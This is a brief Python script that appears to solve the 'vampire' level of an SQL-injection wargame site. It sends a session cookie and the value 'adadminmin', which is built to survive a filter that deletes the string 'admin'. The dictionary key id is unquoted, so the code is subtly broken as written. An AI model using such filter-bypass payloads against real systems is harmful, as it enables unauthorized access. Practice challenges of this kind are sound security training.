import requests

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php"
params = { id: "adadminmin" }

r = requests.get(url, params=params, cookies=cookies)
print(r.text)